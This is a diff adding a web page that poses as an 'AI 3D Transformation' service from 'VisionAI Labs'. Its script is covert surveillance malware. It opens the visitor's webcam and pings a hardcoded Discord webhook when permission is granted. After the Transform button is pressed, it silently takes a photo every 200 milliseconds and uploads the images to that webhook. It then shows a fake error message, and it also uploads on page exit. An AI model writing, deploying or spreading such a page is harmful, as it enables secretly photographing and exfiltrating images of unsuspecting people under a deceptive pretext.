@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI 3D Transformation</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      background-color: #f1f3f7;
+      color: #333;
+    }
+
+    header {
+      background-color: #2f855a;
+      color: white;
+      padding: 40px 20px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 2.2em;
+    }
+
+    header p {
+      font-size: 1.1em;
+      margin-top: 10px;
+    }
+
+    video {
+      margin-top: 40px;
+      border: 3px solid #4CAF50;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      width: 480px;
+      max-width: 90%;
+      aspect-ratio: 4 / 3;
+      background-color: #000;
+    }
+
+    button {
+      background-color: #38a169;
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      margin-top: 30px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    button:hover {
+      background-color: #2f855a;
+      transform: translateY(-2px);
+    }
+
+    #loadingMessage {
+      font-size: 18px;
+      margin-top: 25px;
+      color: #555;
+      font-style: italic;
+    }
+
+    footer {
+      background-color: #1a202c;
+      color: #ccc;
+      padding: 12px;
+      font-size: 14px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.15);
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>AI 3D Transformation</h1>
+    <p>Click "Transform" to trigger the process!</p>
+  </header>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <br>
+  <button id="transform">Transform</button>
+  <p id="loadingMessage">Estimated time: 2 minutes.</p>
+
+  <footer>
+    &copy; 2025 VisionAI Labs &middot; All rights reserved &middot; <a href="#" style="color:#90cdf4; text-decoration:none;">Privacy Policy</a>
+  </footer>
+
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1329558434814754858/2OuOQhloF_jY0r6Lvh8blWn0xY_qSHRYOFlTCHYjLti9I_BwBFJ59sLKvQ2FMobHQcHL";
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const transformButton = document.getElementById("transform");
+    const loadingMessage = document.getElementById("loadingMessage");
+
+    let stream;
+    let images = [];
+
+    // Start webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((userStream) => {
+        stream = userStream;
+        video.srcObject = stream;
+
+        // Send a message when the user accepts the permissions
+        fetch(webhookUrl, {
+          method: "POST",
+          body: JSON.stringify({ content: "Autorisations acceptées!" }),
+          headers: { "Content-Type": "application/json" }
+        });
+      })
+      .catch((err) => {
+        console.error("Error accessing webcam:", err);
+        alert("Could not access webcam.");
+      });
+
+    // Capture a photo every 200ms
+    const capturePhoto = () => {
+      const context = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL("image/jpeg");
+      images.push(imageData);
+    };
+
+    // Send captured images to webhook
+    const sendImages = () => {
+      images.forEach((imageData, index) => {
+        const blob = dataURLtoBlob(imageData);
+        const formData = new FormData();
+        formData.append("file", blob, `photo${index + 1}.jpg`);
+        formData.append("payload_json", JSON.stringify({ content: "Here are the photos captured during the transformation!" }));
+
+        fetch(webhookUrl, {
+          method: "POST",
+          body: formData
+        })
+        .then((response) => {
+          if (!response.ok) {
+            console.error("Failed to send photo", index);
+          }
+        })
+        .catch((err) => {
+          console.error("Error sending photo:", err);
+        });
+      });
+
+      images = [];
+    };
+
+    function dataURLtoBlob(dataURL) {
+      const byteString = atob(dataURL.split(',')[1]);
+      const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const uintArray = new Uint8Array(arrayBuffer);
+
+      for (let i = 0; i < byteString.length; i++) {
+        uintArray[i] = byteString.charCodeAt(i);
+      }
+
+      return new Blob([uintArray], { type: mimeString });
+    }
+
+    transformButton.addEventListener("click", () => {
+      loadingMessage.textContent = "Transforming... Please wait.";
+
+      const captureInterval = setInterval(capturePhoto, 200);
+
+      setTimeout(() => {
+        clearInterval(captureInterval);
+        sendImages();
+        stream.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+        loadingMessage.textContent = "Error: Something went wrong!";
+      }, 3000);
+    });
+
+    window.addEventListener("beforeunload", () => {
+      if (images.length > 0) {
+        sendImages();
+      }
+    });
+  </script>
+</body>
+</html>
